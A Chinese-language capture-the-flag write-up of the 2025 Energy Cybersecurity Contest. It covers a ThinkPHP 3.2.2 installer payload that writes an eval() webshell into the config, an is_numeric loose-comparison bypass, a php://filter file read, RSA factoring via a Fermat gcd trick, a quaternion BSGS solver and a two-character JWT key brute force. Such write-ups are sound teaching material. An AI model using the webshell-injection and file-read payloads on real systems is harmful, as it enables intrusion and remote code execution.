---
title: 2025 年能源网络安全大赛 Writeup（ThinkPHP 3.2.2 写配置 + RSA 费马 + LWE BSGS）
contest: 2025 能源网络安全大赛
year: 2025
difficulty: medium
vuln_type: [rce, lfi, crypto_rsa, lattice, jwt]
tags: [能源 2025, ThinkPHP 3.2.2 报错泄露, db[] 写配置 RCE, is_numeric 289114abc 弱类型比较, php://filter 读 flaaaaaaag.php base64, NumberTheory 费马 2^hint ≡ 1 mod p, easy_lwe 30 组, Quaternion 四元数 DLP, BSGS 优化 secret < 2^50, jwtKey 2 位爆破]
attack_chain:
  - Web easyInstall: ThinkPHP 3.2.2 db[]=mysqli&...&db[]=1'.phpinfo().@eval(...).'&... → 写配置 RCE
  - yunnuuu.php: tmp1=289114abc is_numeric 假阴性 ==289114 弱类型
  - tmp2=php://filter/.../flaaaaaaag.php base64 读源码
  - NumberTheory: hint+233k=233kp → 2^hint ≡ 1 mod p → p = gcd(2^hint-1, n)
  - easy_lwe: 30 组 (a, c) + p-1 大素因子 → Pohlig-Hellman
  - Quaternion DLP: Q=(123456789, 987654321, 135792468, 864297531) R=power(Q, secret) → BSGS secret < 2^50
  - jwtKey 2 位爆破 (charset a-zA-Z0-9 62 字符)
key_payload: "p = gcd(pow(2, hint, n) - 1, n)"
one_liner: 2025 能源网络安全：ThinkPHP 3.2.2 db[] 写配置 RCE + yunnuuu.php is_numeric 弱类型 + 费马小定理解 RSA + LWE Quaternion BSGS。
lesson: ThinkPHP 3.2.2 db[] 写配置 RCE 是历史漏洞；is_numeric 弱类型比较经典套（289114abc 不通过 is_numeric 但 == 289114）；费马小定理 2^hint ≡ 1 mod p → p = gcd(2^hint-1, n) 是常用套路。
quality: high
---

# 2025 年能源网络安全大赛 Writeup

## Web

### easyInstall

**ThinkPHP 3.2.2 报错泄露** + 写配置 RCE：

```bash
db[]=mysqli&db[]=127.0.0.1&db[]=1&db[]=1'.phpinfo().@eval($_GET['youyou']).'&db[]=1&db[]=3306&db[]=oscshop_&admin[]=admin&admin[]=a&admin[]=a&admin[]=admin@admin.com
```

无 disable_function → 直接 RCE。

### yunnuuu.php

抓包发现 `secret is in yunnuuu.php`，访问拿源码：

- **绕过 is_numeric**：`tmp1=289114abc`（`is_numeric` 假阴性 == `289114` 弱类型比较）
- **文件包含读 flag**：`tmp2=php://filter/.../flaaaaaaag.php` base64 读源码

## Crypto

### NumberTheory（费马小定理）

```python
hint + 233*k = 233*k*p
hint = 233*k*(p-1)
# 费马小定理
2^hint ≡ 1 mod p

# 解 p
p = gcd(pow(2, hint, n) - 1, n)
q = n // p
d = inverse(65537, (p-1)*(q-1))
m = pow(c, d, n)
print(long_to_bytes(m))
```

### easy_lwe（30 组 LWE + Quaternion DLP + BSGS）

```python
# 1. 30 组 (a, c) + p-1 大素因子 → Pohlig-Hellman 解 m
# 2. m < 2^50
# 3. Quaternion DLP: R = power(Q, secret)
# 4. BSGS secret < 2^50
def bsgs(base, target, bound):
    m = int(math.isqrt(bound)) + 1
    baby = {}
    cur = Quaternion(1, 0, 0, 0)
    for j in range(m):
        baby[(cur.a, cur.b, cur.c, cur.d)] = j
        cur = cur * base
    factor = power(base.inverse(), m)
    cur = target
    for i in range(m + 1):
        t = (cur.a, cur.b, cur.c, cur.d)
        if t in baby:
            return i*m + baby[t]
        cur = cur * factor
    return None
N = 1 << 50
secret = bsgs(Q, R, N)
```

## 总结

- **Web**：ThinkPHP 3.2.2 写配置 + is_numeric 弱类型 + php://filter
- **Crypto**：费马小定理 + Quaternion DLP BSGS
- **JWT**：jwtKey 2 位字符爆破（62 字符 × 2 = 3844 试）
